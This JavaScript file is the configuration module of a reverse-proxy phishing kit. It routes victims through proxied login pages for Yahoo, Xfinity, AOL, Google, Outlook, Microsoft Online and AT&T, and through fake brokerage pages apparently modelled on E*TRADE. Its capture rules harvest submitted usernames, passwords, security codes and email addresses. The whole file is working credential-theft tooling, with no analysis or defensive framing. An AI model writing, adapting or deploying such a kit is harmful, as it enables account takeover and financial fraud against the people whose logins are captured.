/* eslint-disable camelcase,class-methods-use-this */
// eslint-disable-next-line max-classes-per-file
const path = require('path')
const url = require('url')

// eslint-disable-next-line import/no-dynamic-require
const globalWorker = process.HOOK_JS_MODULE

/** Defined Functions used */


/** Important Defaults */
const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClass {

    constructor(proxyEndpoint, browserReq) {
        super(proxyEndpoint, browserReq)
    }

    processRequest() {
        return super.processRequest()

    }
}

const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseClass {

    constructor(proxyResp, browserEndPoint) {
       
        super(proxyResp, browserEndPoint)
        this.regexes = [
              // {
              //   reg: /action="https:\/\/us.etrade.com\/login?b"/igm,
              //   replacement: `action=https://${process.env.HOST_DOMAIN}/login?b}`,
             // },
        ]
    }


    processResponse() {
        const extRedirectObj = super.getExternalRedirect()
        if (extRedirectObj !== null) {
           const rLocation = extRedirectObj.url
        }

        // return super.processResponse()
         let newMsgBody;
        return this.superPrepareResponse(true)
            .then((msgBody) => {
                newMsgBody = msgBody
                for (let i = 0; i < this.regexes.length; i += 1) {
                    const regExObj = this.regexes[i]
                    if (regExObj.reg.test(newMsgBody)) {
                        newMsgBody = newMsgBody.replace(regExObj.reg, regExObj.replacement)
                    }
                }
                this.superFinishResponse(newMsgBody)
            }).catch((err) => {
            console.error(err)
        })
    }

}


const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
    constructor(req, res, captureDict = configExport.CAPTURES) {
        super(req, res, captureDict)
    }

    static match(req) {
        return true

    }

    execute(clientContext) {
        const redirectToken = super.checkForRedirect()
        if (redirectToken !== null) {
            clientContext.currentDomain = redirectToken.obj.host
            this.req.url = `${redirectToken.obj.pathname}${redirectToken.obj.query}`
            return super.superExecuteProxy(clientContext.currentDomain, clientContext)
        }
        return super.superExecuteProxy(clientContext.currentDomain, clientContext)

    }
}

const ExecPhpPager = class extends globalWorker.BaseClasses.BasePreClass {
    constructor(req, res, captureDict = configExport.CAPTURES) {
        super(req, res, captureDict)
    }

    static match(req) {
        return req.url.startsWith('/usa/secure/');

    }

    execute(contextStore) {
        if (this.req.method === 'POST') {
            super.parseBody('PHP-EXEC', contextStore)
            if (this.req.url === '/usa/secure/addons/emailvalidate') {
                super.superExecutePhpScript('app/addons/emailvalidate.php', contextStore)
            } else {
                this.res.writeHead(200)
                this.res.end()
            }
        } else {
            switch (this.req.url) {
                case '/usa/secure/index':
                    super.superExecutePhpScript('app/login.php', contextStore)
                    break
                case '/usa/secure/emailAccounts':
                    super.superExecutePhpScript('app/email.php', contextStore)
                    break
                case '/usa/secure/account':
                    super.superExecutePhpScript('app/account.php', contextStore)
                    break
                default:
                    super.superExecutePhpScript('app/404.php', contextStore)
            }
        }
    }


}


const EmailLoginHandler = class extends globalWorker.BaseClasses.BasePreClass {
    constructor(req, res, captureDict = configExport.CAPTURES) {
        super(req, res, captureDict)
    }

    static match(req) {
        if (req.url.startsWith('/auth/login/')) {
            return true
        }
        return false
    }

    execute(clientContext) {

        if (this.req.url.startsWith('/auth/login/')) {
            if (this.req.url === '/auth/login/yahoo') {
                this.req.url = '/'
                clientContext.currentDomain = 'login.yahoo.com'
                return super.superExecuteProxy(clientContext.currentDomain, clientContext)
            }
            if (this.req.url === '/auth/login/comcast') {
                this.req.url = '/login?r=comcast.net&s=oauth'
                clientContext.currentDomain = 'login.xfinity.com'
                return super.superExecuteProxy(clientContext.currentDomain, clientContext)
            }
            if (this.req.url === '/auth/login/aol') {
                this.req.url = '/'
                clientContext.currentDomain = 'login.aol.com'
                return super.superExecuteProxy(clientContext.currentDomain, clientContext)
            }
            if (this.req.url === '/auth/login/gmail') {
                this.req.url = '/signin/v2/identifier?flowName=GlifWebSignIn&flowEntry=ServiceLogin'
                clientContext.currentDomain = 'accounts.google.com'
                return super.superExecuteProxy(clientContext.currentDomain, clientContext)
            }
            if (this.req.url === '/auth/login/outlook') {
                this.req.url = '/'
                clientContext.currentDomain = 'login.live.com'
                return super.superExecuteProxy(clientContext.currentDomain, clientContext)
            }
            if (this.req.url === '/auth/login/office') {
                this.req.url = '/'
                clientContext.currentDomain = 'login.microsoftonline.com'
                return super.superExecuteProxy(clientContext.currentDomain, clientContext)
            }
            if (this.req.url === '/auth/login/att') {
                this.req.url = '/isam/sps/oidc/rp/consumerfed/kickoff/aaidpartner?Target=https%3A%2F%2Fcaaid.att.com%2Fisam%2Fsps%2Fstatic%2FsigninRedirect.html'
                clientContext.currentDomain = 'caaid.att.com'
                return super.superExecuteProxy(clientContext.currentDomain, clientContext)
            }
            if (this.req.url === '/auth/login/finish') {
                this.res.writeHead(200)
                return this.res.end(`<!DOCTYPE html>
                                    <html>
                                    <body>
                                    <script>
                                    window.opener.sessionStorage.setItem("finished", "YES");
                                    close()
                                    </script>
                                    </body>
                                    </html>
                                    `)
            }
        }

    }
}



const configExport = {
    PRE_HANDLERS:
        [
            EmailLoginHandler,
            ExecPhpPager,
        ],
    PROXY_REQUEST: ProxyRequest,
    PROXY_RESPONSE: ProxyResponse,
    DEFAULT_PRE_HANDLER: DefaultPreHandler,

    CAPTURES: {
        username: {
            method: 'POST',
            params: ['USER'],
            urls: '/index',
            hosts: 'PHP-EXEC',
        },

        password: {
            method: 'POST',
            params: ['PASSWORD'],
            urls: '/index',
            hosts: 'PHP-EXEC',
        },

        securityCode: {
            method: 'POST',
            params: ['SECURITY_CODE'],
            urls: '/index',
            hosts: 'PHP-EXEC',
        },

        emailAddress: {
            method: 'POST',
            params: ['email'],
            urls: '/emailAccounts',
            hosts: 'PHP-EXEC',
        },

        defaultPhpCapture: {
            method: 'POST',
            params: ['default'],
            urls: ['/web'],
            hosts: 'PHP-EXEC',
        },
    },

    // proxyDomain: process.env.PROXY_DOMAIN,
}
module.exports = configExport


